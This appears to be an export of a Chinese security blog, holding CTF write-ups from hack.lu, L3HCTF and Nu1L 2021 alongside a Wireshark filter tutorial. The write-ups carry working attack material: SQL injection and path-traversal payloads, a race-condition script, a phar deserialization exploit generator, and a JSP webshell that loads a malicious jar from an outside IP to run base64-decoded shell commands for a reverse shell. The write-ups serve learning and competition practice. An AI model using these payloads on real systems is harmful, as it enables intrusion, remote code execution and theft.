思路如果我们可以在转义之前就插入%'，那么后面转义后就变成%\\'，此时在经过vsprintf函数，就会变成只剩下单引号以后的内容',但此时会引起语法上报错，因为有两个%，但是后面只有一个参数，匹配不上，而在格式化字符串中匹配中没有%1$'这个格式，将会被直接舍弃掉,这个就不会引起报错了 &lt;?php$a=&quot;name='%\\'%s&quot;;$b=vsprintf($a,'a');echo $b;#Warning: vsprintf(): Too few arguments in&lt;?php$a=&quot;name='%1$\\'%s&quot;;$b=vsprintf($a,'a');echo $b;#name=''a 构造来分析一下他代码的执行过程 #先尝试password=1%1$') or 1=1#则(转义后)变成:1%$1\\') or 1=1#然后变成SELECT * FROM `users` where password=sha1('1%1$\\') or 1 = 1#')此时还需要在经过sprintf才能消去%1$\\让单引号逃逸出来，所以还要在post一次name让他在经过一次sprintf，此时即可登录成功最终payloadpassword=1%1$') or 1=1#&amp;name=a 登陆成功以后仅仅只是个开始，再来看看源码，提供了下载功能，意味着我们可以文件下载来读取flag，但是存在一点，我们不知道secret，所以无法伪造那个sha加密，但是我们现在有现成的两个文件，他们有提供这个sha加密的结果 但是如果我们直接传入 ?h=f2d03c27433d3643ff5d20f1409cb013&amp;file_name=FlagNotHere.txt&amp;file_name=../../../../../flag.txt 原本的的file_name将会直接被覆盖，就过不去后面的hash比对 所以这里就利用QUERY_STRING传入的不会urldecode，还有在php中空格会自动解析为_的特性把上面的payload改为 ?h=f2d03c27433d3643ff5d20f1409cb013&amp;file_name=FlagNotHere.txt&amp;file%20name=../../../../../flag.txt 此时可以发现，两个检测时值互相不覆盖 而后空格被解析为下划线，当面对两个file_name值的时候，php就会默认选择后者 此时就可以下载得到flag了 NODENB注册登录以后，来看看源码，他使用的是redis的数据库，所以命令集都是redis的，并且可以直接调用，但是对于redis的命令都比较陌生，所以要学习一下: const db = {};const asyncBinds = [ 'get', 'set', 'setnx', 'incr', 'exists', 'del', 'hget', 'hset', 'hgetall', 'hmset', 'hexists', 'sadd', 'srem', 'smembers', 'sismember',]; 主要看看和flag有关的，首先是创了一个用户叫做system，然后这里就是创建了一个note库？然后里面有个flag表，然后他有个字段title叫FLAG，值为FLAG，来自于前面定义的环境变量 db.hset('uid:1', 'name', 'system');db.set('user:system', '1');db.setnx('index:uid', 1);db.hmset('note:flag', { 'title': 'Flag', 'content': FLAG,}); 很明显，需要从这里得到，访问/notes/flag，接下来他会校验id app.get('/notes/:nid', ensureAuth, async (req, res) =&gt; { const { nid } = req.params; if (!await db.hasUserNoteAcess(req.session.user.id, nid)) { return res.redirect('/notes'); } const note = await db.getNote(nid); res.render('note', { note });}); 这里看一下他是如何进行校验的,第一个比较时肯定可以过的，第二个是比较用户名是否存在于对应的hash表 async hasUserNoteAcess(uid, nid) {//Redis Sismember 命令判断成员元素是否是集合的成员,nid为flag，那一定是，这个是表里有的 if (await db.sismember(`uid:${uid}:notes`, nid)) { return true; }//Hexists 命令用于查看哈希表的指定字段是否存在 if (!await db.hexists(`uid:${uid}`, 'hash')) { // system user has no password return true; } return false; 按照上面的逻辑，就是我们要先登录system的账号，然后才可以访问到flag，但是上面又说system是没有密码的，但是这里又需要你的密码是非空且为string，那么这里就是一个矛盾点了，怎么可能让password非空然后又符合空以后加密的hash值 if (!username || !password || typeof username !== 'string' || typeof password !== 'string') { res.flash('danger', 'invalid username or password'); return res.status(400).render('login'); } 但其实也不一定要登录，因为他验证的是会话的hash值，所以如果我们可以伪造得到这个会话，也是能达到最终目的,额很明显，伪造是不可能的，再回去看了一下上面的验证逻辑，他验证的函数是hexists，即在这个hash表中有没有这个hash值，如果没有的话，那就是true！那是不是存在当我们删除这个某个用户以后，他的session还在，但是已经没有这个hash值了呢？ if (!await db.hexists(`uid:${uid}`, 'hash')) { // system user has no password return true; } 来看看他删除的过程，这里再贴一下创建的过程会理解的比较清楚一些 async createUser(name, password) { const isAvailable = await db.setnx(`user:${name}`, 'PLACEHOLDER'); if (!isAvailable) { throw new Error('user already exists!'); } const uid = await db.incr('index:uid'); await db.set(`user:${name}`, uid); const hash = await argon2.hash(password); await db.hmset(`uid:${uid}`, { name, hash }); return uid; }, 对比创建和删除，可以发现，当删除了uid以后，name和对应的hash也会删除，然后session是在后面删除的 async deleteUser(uid) { const user = await helpers.getUser(uid); await db.set(`user:${user.name}`, -1); await db.del(`uid:${uid}`); const sessions = await db.smembers(`uid:${uid}:sessions`); const notes = await db.smembers(`uid:${uid}:notes`); return db.del([ ...sessions.map((sid) =&gt; `sess:${sid}`), ...notes.map((nid) =&gt; `note:${nid}`), `uid:${uid}:sessions`, `uid:${uid}:notes`, ]); }, 而在这个模块中，有延时存在，进入flash以后会对session进行操作，可以理解为暂时替我们保留了一会session if (req.query.random) { const ms = Math.floor(2000 + Math.random() * 1000); await new Promise(r =&gt; setTimeout(r, ms)); res.flash('info', `Our AI ran ${ms}ms to generate this piece of groundbreaking research.`); content = 'Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit amet.'; } 思路创建用户，然后启用延时功能，在删除该用户的同时，使用它的session访问notes/flag表，但是我试了几次都没成功，想着会不会是手速不够快？这里涉及到多进程并行的情况，学习一下这个 class multiprocessing.Process(group=None, target=None, name=None, args=(), kwargs={}, *, daemon=None)start()方法启动，这样创建进程比fork()还要简单。join()方法可以等待子进程结束后再继续往下运行(更准确地说，在当前位置阻塞主进程，带执行join（）的进程结束后再继续执行主进程#这里说一下join方法，比如说有主进程和a和在执行，那么就是主进程执行然后紧跟着a.start()，遇到a.join()就会先阻塞主进程，等到a执行完毕，再执行主进程 import requestsimport randomimport stringfrom multiprocessing import Processfrom time import sleepimport reurl = &quot;https://nodenb.flu.xxx&quot;def register(u,p): data={ &quot;username&quot;:u, &quot;password&quot;:p } r=s.post(url+'/register',data=data) return rdef login(u,p): data={ &quot;username&quot;:u, &quot;password&quot;:p } r=s.post(url+'/login',data=data) return rdef deleteme(): r=s.post(url+&quot;/deleteme&quot;) return rdef get_flag(): r=s.get(url+&quot;/notes/flag&quot;) print(r.text) return rdef sleep_notes(title,content,s): p=&quot;/notes?random=true&quot; r=s.post(url+p,data={'title':title,'content':content})if __name__==&quot;__main__&quot;: while True: s = requests.session() u = ''.join([random.choice(string.ascii_letters) for _ in range(3)]) p = ''.join([random.choice(string.ascii_letters) for _ in range(3)]) r1=register(u,p) l1=login(u,p) print(&quot;a&quot;,s.cookies) c=s.cookies.get(&quot;connect.sid&quot;) p=Process(target=sleep_notes,args=('a','a',s)) p.start() sleep(0.5) d=deleteme() p.join() s.cookies.update({&quot;connect.sid&quot;:c}) r=get_flag() if re.search(&quot;flag&quot;,r.text): print() break 最后还是没出来。头晕了– trading-api(High)js文件有点多，从页面入手吧，一开始他说我们没有tooken function authn(req, res, next) { const authHeader = req.header('authorization'); if (!authHeader) { return res.status(400).send('missing auth token'); } try { req.user = jsonwebtoken.verify(authHeader, JWT_SECRET); next(); } catch (error) { return res.status(401).send('invalid auth token'); }} 所以来看看login的地方 async function login(req, res) { const { username, password } = req.body; if (!username || !password) { return res.status(400).send('missing username or password'); } try { const r = await got.post(`${AUTH_SERVICE}/api/users/${encodeURI(username)}/auth`, { headers: { authorization: AUTH_API_TOKEN }, json: { password }, }); if (r.statusCode !== 200) { return res.status(401).send('wrong'); } const jwt = jsonwebtoken.sign({ username }, JWT_SECRET); return res.json({ token: jwt }); } catch (error) { return res.status(503).end('error'); }}","link":"/2021/10/31/2021hack-lu/"},{"title":"wireshark工具操作","text":"Wireshark使用教程（界面说明、捕获过滤器表达式、显示过滤器表达式）一、说明1.1 背景说明对于大多数刚开始接触wireshark的使用者而言，经常是开始的时候时候看到wireshark能把所有数据包都拦截下来觉得强无敌，但是面对一大堆的数据包要问有什么用或者说想要找到我想要的那些数据包怎么找（比如telnet登录过程的那些数据包）则完全是一脸茫然。 一是界面一堆窗口，什么作用什么区别看不懂；二是捕获、显示过滤器表达示看不出有什么规律，每次过滤都要百度找半天。其实wireshark界面还是比较清晰的，过滤器表过示也不困难，我们今天就来破解这wireshark使用的两大难题。 官网地址：https://www.wireshark.org/ 官网下载地址：https://www.wireshark.org/#download 安装就不多说了和一般windows一样下一步下一下装就可以了。另外ethereal为什么在2006年更名wireshark参见：https://www.linux.com/news/ethereal-changes-name-wireshark 1.2 拦截本地回环数据另外注意本机访问本机的回环数据是不经过网卡的，比如我们在本机访问搭建在本机上的web服务，但我们经常有服务搭建在本机的操作也经常有拦截本地回环数据包加以分析的需求，所以我们环要拦载回环数据包。操作如下。 首先，以管理员身份运行cmd（普通用户没有路由表操作权限，会提示“请求的操作需要提升”） 然后，使用ipconfig查看本机ip和网关： ipconfig 再然后，使用以下命令添加路由，指定回环数据也要先转发到网关（使用上一步获取本的本机ip和网关替换其中的和）： route add &lt;your_IP&gt; mask 255.255.255.255 &lt;gateway_IP&gt; metric 1 最后，查看路由表中路由是否已添加成功： route print 回环数据经网关再回来会增加网卡的压力，可使用以下命令删除路由（使用前边获取本的本机ip替换其中的）： route delete &lt;your_IP&gt; 二、Wireshark界面说明过滤器表达式书写是wireshark使用的核心，但在此之前，很多初学者还会碰到一个难题，就是感觉wireshark界面上很多东西不懂怎么看。其实还是挺明了的我们下面简单说一下，如下图。 1号窗口展示的是wireshark捕获到的所有数据包的列表。注意最后一列Info列是wireshark组织的说明列并不一定是该数据包中的原始内容。 2号窗口是1号窗口中选定的数据包的分协议层展示。底色为红色的是因为wireshark开启校验和验证而该层协议校验和又不正确所致。 3号窗口是1号窗口中选定的数据包的源数据，其中左侧是十六进制表示右侧是ASCII码表示。另外在2号窗口中选中某层或某字段，3号窗口对应位置也会被高亮。 被认为最难的其实还是2号窗口展开后的内容不懂怎么看，其实也很明了，以IP层为例： 每一行就对应该层协议的一个字段；中括号行是前一字段的说明。 冒号前的英文是协议字段的名称；冒号后是该数据包中该协议字段的值。 三、捕获过滤器表达式捕获过滤器表达式作用在wireshark开始捕获数据包之前，只捕获符合条件的数据包，不记录不符合条件的数据包。 捕获过滤器表达式没有像显示过滤器表达式那样明显的规律，但写法不多所以也不难；而且除非全部捕获要占用的磁盘空间实现太大，且你非常明确过滤掉的数据包是你不需要的，不然一般都不用捕获过滤器表达式而用显示过滤器表达式。 在wireshark2.x版本，启动后欢迎界面即有捕获过滤器，在其中输入过滤表达式开始捕获数据包时即会生效： 点击图中“书签”标志，再点管理“捕获筛选器”，即可看到常用捕获过滤表达示的书写形式 四、显示过滤器表达示及其书写规律显示过滤器表达式作用在在wireshark捕获数据包之后，从已捕获的所有数据包中显示出符合条件的数据包，隐藏不符合条件的数据包。 显示过滤表达示在工具栏下方的“显示过滤器”输入框输入即可生效 4.1 基本过滤表达式一条基本的表达式由过滤项、过滤关系、过滤值三项组成。 比如ip.addr == 192.168.1.1，这条表达式中ip.addr是过滤项、==是过滤关系，192.168.1.1是过滤值（整条表达示的意思是找出所有ip协议中源或目标ip、等于、192.168.1.1的数据包） 4.1.1 过滤项初学者感觉的“过滤表达式复杂”，最主要就是在这个过滤项上：一是不知道有哪些过滤项，二是不知道过滤项该怎么写。 这两个问题有一个共同的答案—–wireshark的过滤项是“协议“+”.“+”协议字段”的模式。以端口为例，端口出现于tcp协议中所以有端口这个过滤项且其写法就是tcp.port。 推广到其他协议，如eth、ip、udp、http、telnet、ftp、icmp、snmp等等其他协议都是这么个书写思路。当然wireshark出于缩减长度的原因有些字段没有使用协议规定的名称而是使用简写（比如Destination Port在wireshark中写为dstport）又出于简使用增加了一些协议中没有的字段（比如tcp协议只有源端口和目标端口字段，为了简便使用wireshark增加了tcp.port字段来同时代表这两个），但思路总的算是不变的。而且在实际使用时我们输入“协议”+“.”wireshark就会有支持的字段提示（特别是过滤表达式字段的首字母和wireshark在上边2窗口显示的字段名称首字母通常是一样的），看下名称就大概知道要用哪个字段了。wireshark支持的全部协议及协议字段可查看官方说明。 4.1.2 过滤关系过滤关系就是大于、小于、等于等几种等式关系，我们可以直接看官方给出的表。注意其中有“English”和“C-like”两个字段，这个意思是说“English”和“C-like”这两种写法在wireshark中是等价的、都是可用的。 4.1.3 过滤值过滤值就是设定的过滤项应该满足过滤关系的标准，比如500、5000、50000等等。过滤值的写法一般已经被过滤项和过滤关系设定好了，只是填下自己的期望值就可以了。 4.2 复合过滤表达示所谓复合过滤表达示，就是指由多条基本过滤表达式组合而成的表达示。基本过滤表达式的写法还是不变的，复合过滤表达示多出来的东西就只是基本过滤表达示的“连接词” 我们依然直接参照官方给出的表，同样“English”和“C-like”这两个字段还是说明这两种写法在wireshark中是等价的、都是可用的。 4.3 常见用显示过滤需求及其对应表达式数据链路层： 筛选mac地址为04:f9:38:ad:13:26的数据包—-eth.src == 04:f9:38:ad:13:26 筛选源mac地址为04:f9:38:ad:13:26的数据包—-eth.src == 04:f9:38:ad:13:26 网络层： 筛选ip地址为192.168.1.1的数据包—-ip.addr == 192.168.1.1 筛选192.168.1.0网段的数据—- ip contains “192.168.1” 筛选192.168.1.1和192.168.1.2之间的数据包—-ip.addr == 192.168.1.1 &amp;&amp; ip.addr == 192.168.1.2 筛选从192.168.1.1到192.168.1.2的数据包—-ip.src == 192.168.1.1 &amp;&amp; ip.dst == 192.168.1.2 传输层： 筛选tcp协议的数据包—-tcp 筛选除tcp协议以外的数据包—-!tcp 筛选端口为80的数据包—-tcp.port == 80 筛选12345端口和80端口之间的数据包—-tcp.port == 12345 &amp;&amp; tcp.port == 80 筛选从12345端口到80端口的数据包—-tcp.srcport == 12345 &amp;&amp; tcp.dstport == 80 应用层： 特别说明—-http中http.request表示请求头中的第一行（如GET index.jsp HTTP/1.1），http.response表示响应头中的第一行（如HTTP/1.1 200 OK），其他头部都用http.header_name形式。 筛选url中包含.php的http数据包—-http.request.uri contains “.php” 筛选内容包含username的http数据包—-http contains “username”","link":"/2021/10/20/wireshark%E5%B7%A5%E5%85%B7%E6%93%8D%E4%BD%9C/"},{"title":"2021l3ctf","text":"easyphp送分题发现password没那么短，双击复制一下，然后urlencode &lt;?phpecho urlencode(&quot;‮⁦L3H⁩⁦password&quot;);echo &quot;\\n&quot;;echo urlencode(&quot;‮⁦CTF⁩⁦l3hctf&quot;);?&gt; 接下来发送即可 image-service1share图片，注册了一下，发现a可以share到b的，然后admin不让注册，也不让share，但是试了一下，发现ADMIN也同样可以share到。。。 image-service2看了半天，要想读到flag2就需要更改blur参数还有x，但是直接改的话，会说token不存在，所以觉得还是应该看看参数和uuid的关系是啥样的，正好附件里面有docker文件，起一个docker看看，正好学习一下如何弄这个玩意： 参考链接：https://cloud.tencent.com/developer/article/1169085 up 安装组下的容器集合默认的yml的文件名称是当前目录下的docker-compose.yml，如果需要指定：docker-compose -f 文件名 updocker-compose up -d 后台运行不显示日志pwdcurl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://b81aace9.m.daocloud.iosudo docker-compose -f docker-compose.yml up 需要注意的是，在配置env的时候，需要更改一些参数，踩坑主要也是在loc需要配置为你的服务器ip地址，但是在这里不知道为啥这样也起不了，但是1002的端口可以开启，所以就直接用了，这里确实没想到，其实直接查看docker的日志，看看get那边的值是如何传入的就行了，如何才能做到tooken一致 对比一下 首先我发了两次blur=20的 发现他们的tooken都是一样的，如下所示，当我更改值以后，他们的tooken就发生改变了，可以看到标黄的那段，那么要如何绕过呢，可以看到他经过了一个map处理，猜想这里的map是对里面的值进行计算然后得到一个tooken，那么如果我们可以做到输入blur:[20]在实际中其实又没有这个值，那就可以绕过了 image-service-nginx-1 | 211.97.128.174 - - [16/Nov/2021:09:59:50 +0000] &quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[20] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[200] y1:[200]]image-service-service-1 | //c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 09:59:50 | 403 | 62.594µs | 172.18.0.2 | GET &quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;image-service-nginx-1 | 211.97.128.174 - - [16/Nov/2021:10:05:42 +0000] &quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[20] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[200] y1:[200]]image-service-service-1 | //c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 10:05:42 | 403 | 65.684µs | 172.18.0.2 | GET &quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;211.97.128.174 - - [16/Nov/2021:10:07:26 +0000] &quot;GET /get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[0] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[0] y1:[200]]image-service-service-1 | //6c73f2e8bb98f6d40cc95e9d716a126e2fc6c320322df005cb1532c4a9ff3043 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 10:07:26 | 403 | 94.621µs | 172.18.0.2 | GET &quot;/get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200&quot; 211.97.128.174 - - [16/Nov/2021:10:14:55 +0000] &quot;GET /get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200 HTTP/1.1&quot; 403 25 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot; &quot;-&quot;image-service-service-1 | map[blur:[20] text:[secret] textsize:[50] uuid:[4bb2c93b-b18f-42fc-97fc-ec5a3afbab64] x1:[200] y1:[200]]image-service-service-1 | //c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907image-service-service-1 | [GIN] 2021/11/16 - 10:14:55 | 403 | 68.117µs | 172.18.0.2 | GET &quot;/get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200&quot; 可以看到最终的tooken和一开始输入blur20的是一样的，但是tooken没有发生改变，所以最终的payload是 get?blur:[20] text=secret&amp;textsize=50&amp;token=61cb06c63c5fb86303c40f4bfd2ea04aa9d7cf3067f8f886c8b30f4e547bc803&amp;uuid=1293b342-b144-42ec-983d-96fba7c159b9&amp;x1:[200] y1=200 bypass一开始是文件后缀绕过，直接双写就可以了，问题在于后续正则匹配的绕过，这里提到，不能输入两个连续的字符串 public static boolean checkValidChars(String content) { Pattern pattern = Pattern.compile(&quot;[a-zA-Z0-9]{2,}&quot;); Matcher matcher = pattern.matcher(content); return matcher.find();} 一开始是定位这里，看这个getString是否有什么特性，后面是没发现的，只知道他是将其作为string读入 String content = item.getString(); 感觉之前的大师傅离成功应该是只有一步之遥了 1.当form中设置method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;时才能正常上传。2.commons-fileupload上传中如果form中的参数有中文，此时用item.getString()会出现乱码，必须用item.getString(&quot;UTF-8&quot;)，UTF-8为编码方式。原文链接：https://blog.csdn.net/pg_guo/article/details/8753449 通过测试，我们可以发现，他是没有过滤汉字，那么汉字乱码肯定是可以绕过的，那我们就对文本使用其他编码形式，比如说当utf-16的文本，以utf-8的形式打开，那肯定是会变成乱码的，根据这个思路，就可以绕过了，写一个自动化脚本（已经有大师傅写过了） import requestsdef file_op(filename,filedata): print(&quot;filename: &quot;,filename) print(&quot;filedata: &quot;, filedata) with open(filename,'wb') as f: f.write(filedata) r = requests.post('http://123.60.20.221:10001/UploadServlet', files={&quot;filename&quot;: open(filename, &quot;rb&quot;)}) print(r.text) if &quot;文件上传成功! 文件路径: /usr&quot; in r.text: url = &quot;http://123.60.20.221:10001/&quot; + r.text.replace( &quot;文件上传成功! 文件路径: /usr/local/apache-tomcat-8.5.72/webapps/ROOT/&quot;, &quot;&quot;) print(url) r = requests.get(url) print(r.text) print(r.content) return r.textif __name__==&quot;__main__&quot;: filename=&quot;1.jjspsp&quot; filedata=&quot;&quot;&quot; &quot;&quot;&quot;.encode('utf-16') file_op(filename,filedata) 接下来就是绕过第二个黑名单，里面过滤了很多内容，在寻找绕过方式的时候，看到了很多有意思的方法，决定收藏一下，这里说一下Y4大师傅的解题方法 https://f5.pm/go-61281.html 他的黑名单实在多： 黑名单Runtime、\\u、ScriptEngine、newInstance、ProcessBuilder、invoke、File、defineClass、lookup，JdbcRowSetImpl等 然后再次佩服一下大师傅们，太牛了，这里用到的方法是，使用UrlClassLoader与Class.forName在初始化对象时执行命令，首先学习下这两个包 UrlClassLoader:URLClassLoader 可以加载远程类库和本地路径的类库#其实昨晚在做的时候有看到这个思路，但是当时发现有用到newInstance，所以就没往下继续想了，有点可惜Class.forName：装载一个类并且对其进行实例化的操作，装载过程中使用到的类加载器是当前类 Class.forName(xxx.xx.xx)返回的是一个类。Class.forName(xxx.xx.xx)的作用是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段这里说说自己的理解:class.forname其实就是生成这个类的class 首先写一个恶意类，并打包jar上传服务器，这里在学习一下了，如何创建一个jar包。。。https://www.hangge.com/blog/cache/detail_2750.html 贴一下恶意包的代码: package com.tlif;import java.io.IOException;import java.io.UncheckedIOException;public class bad_class { static { try{ Runtime.getRuntime().exec(new String[]{&quot;bash&quot;,&quot;-c&quot;,&quot;echo xxxxx|base64 -d|sh&quot;}); } catch (IOException e){ e.printStackTrace(); } } public static void main(String[] args){new bad_class();}} 接下来将其打包成jar包上传至服务器（记得配置java环境，不然运行不了）然后上传访问该jar包的jsp木马 &lt;%@ page import=&quot;java.net.URL&quot; %&gt;&lt;%@ page import=&quot;java.net.URLClassLoader&quot; %&gt;&lt;% URL url = new URL(&quot;http://110.42.133.120/l3ctf_bp.jar&quot;); URLClassLoader ucl = new URLClassLoader(new URL[]{url}); Class.forName(&quot;com.tlif.bad_class&quot;,true,ucl);%&gt; 接下来访问jsp文件，即可反弹shell fastjson比赛的时候看都看没看的一道题，所以贴一下别人的wp收藏一下","link":"/2021/11/14/2021l3ctf/"},{"title":"2021nu1lctf","text":"signin&lt;?php//flag is /flag$path=$_POST['path'];$time=(isset($_GET['time'])) ? urldecode(date(file_get_contents('php://input'))) : date(&quot;Y/m/d H:i:s&quot;);$name=&quot;D:\\apache\\www\\nu1l\\\\&quot;.time().rand().'.txt';$black=&quot;f|ht|ba|z|ro|;|,|=|g|da|_&quot;;$blist=explode(&quot;|&quot;,$black);foreach($blist as $b){ if(strpos($path,$b) !== false){ die('111'); }}if(file_put_contents($name, $time)){ echo &quot;&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;logpath:$name&lt;/code&gt;&lt;/pre&gt;&quot;;}$check=preg_replace('/((\\s)*(\\n)+(\\s)*)/i','',file_get_contents($path));if(is_file($check)){ echo &quot;&lt;pre class='language-html'&gt;&lt;code class='language-html'&gt;&quot;.file_get_contents($check).&quot;&lt;/code&gt;&lt;/pre&gt;&quot;;} 考点主要在于绕过date的混淆，查阅了一下文档，发现加了反斜杠以后不会被date函数给处理，所以可以直接输入///f/a/l/g存入log中即为/flag，后面又会log文件里面读出值，然后从file_get_content中读取/flag的值，即可拿到flag easy_php考点 phar反序列化，但是重点在于如何绕过脏字符 首先我们需要触发的入口在哪里，只有这里包含了flag.php，并且存在file_exists而且file是可控的 &lt;?phpinclude_once &quot;flag.php&quot;;include_once &quot;log.php&quot;;if(file_exists(@$_GET[&quot;file&quot;])){ echo &quot;file exist!&quot;;}else{ echo &quot;file not exist!&quot;;}?&gt; 这也就是意味着，我们在log.php那边写入文件，在index.php那里读 首先我们需要理清楚触发phar的条件是否都可以具备？，最大的问题在于这里，phar文件要求，他是需要后四位必须为GBMB作为签名来识别的，但是可以发现，我们写入的内容后四位会被没法是GBMB $log = 'Time: ' . date('Y-m-d H:i:s') . ' IP: [' . @$_SERVER['HTTP_X_FORWARDED_FOR'] . '], REQUEST: [' . $gets . '], CONTENT: [' . file_get_contents('php://input') . &quot;]\\n&quot;;$log_file = $log_ip_dir . '/' . $log_type . '_www.log';file_put_contents($log_file, $log, FILE_APPEND); 所以这里就需要换一种思路来解决了，phar://可以反序列化的文件有zip, tar, phar，zip的文件更加严格了，似乎不是直接创建就可以的–，大概原因是他是压缩文件格式吧，我们分别测试一下看看哪一种不会因为脏字符文件尾而导致反序列化失败，分别对phar和tar输出他们文件内容: 可以发现phar文件的文件尾是GBMB，接下来我们针对测试一下修改文件后缀、文件尾、文件头试试1.文件头格式为xxx&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。并且在php当中生成phar文件的时候，这部分内容无法更改，更改以后将无法正确生成phar文件，但其实在本题当中没多大影响，因为生成phar文件的时候，这个头是连接序列化内容一起写入的，不会被打断，并且&lt;?php前面有什么内容都没有影响 2.文件尾文件尾需要GBMB结尾，可以发现，如果被截断的话，将无法正确读取 那么接下来的思路就是构建tar文件，进行phar反序列化了 方法一环境搭建过程: docker run -t easyphp -f ./Dockerfile .systemctl daemon-reloadsudo service docker restartsudo service docker status 首先理一下思路，我们在本地构造了一个tar包，需要做的是将它读取出来写入log文件里面，那么如何将其规范的写入应该是我们面对的问题，这里直接参考大师傅std的脚本了 &lt;?phperror_reporting(0);CLASS FLAG { public function __destruct(){ echo &quot;FLAG: &quot; . $this-&gt;_flag; }}@unlink(&quot;get_flag.tar&quot;);$phar=new PharData(&quot;get_flag.tar&quot;);$phar[&quot;ABCDstypr&quot;] = &quot;GETFLAGGETFLAG&quot;;$obj = new FLAG();print($phar);$phar-&gt;setMetadata($obj); 接下来将其转化一下发送过去，写一个脚本来实现，这里主要以学习为主了– Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。 如果指定的长度小于原字符串的长度则返回原字符串。 一下是处理为新数据的过程 with open(&quot;get_flag.tar&quot;, &quot;rb&quot;) as f: data = f.read() new_name = generated_metadata.ljust(100,'\\x00').encode() new_data = new_name + data[100:] checksum = calc_checksum(new_data) new_checksum = oct(checksum).rjust(7,'0').encode()+b'\\x00' new_data = new_name + data[100:148] + new_checksum + data[156:] with open(&quot;get_flag.log&quot;, &quot;wb&quot;) as f: f.write(new_data) f.write(b&quot;]\\n&quot;) 生成合法的log文件 import osimport sysimport structimport requestsfrom datetime import datetimedef calc_checksum(data): return sum(struct.unpack_from(&quot;148B8x356B&quot;,data))+256if __name__==&quot;__main__&quot;: # generate date and phar content generated_date = os.popen(&quot;php exp_gen.php&quot;).read().split(&quot;FLAG: &quot;)[0] generated_type = &quot;styp979&quot; generated_metadata = &quot;Time: &quot; + generated_date + &quot; IP: [], REQUEST: [log_type=&quot; + generated_type + &quot;], CONTENT: [&quot; # make it into phar format with open(&quot;get_flag.tar&quot;, &quot;rb&quot;) as f: data = f.read() new_name = generated_metadata.ljust(100,'\\x00').encode() new_data = new_name + data[100:] checksum = calc_checksum(new_data) new_checksum = oct(checksum).rjust(7,'0').encode()+b'\\x00' new_data = new_name + data[100:148] + new_checksum + data[156:] with open(&quot;get_flag.log&quot;, &quot;wb&quot;) as f: f.write(new_data) f.write(b&quot;]\\n&quot;) 将其发送至服务器 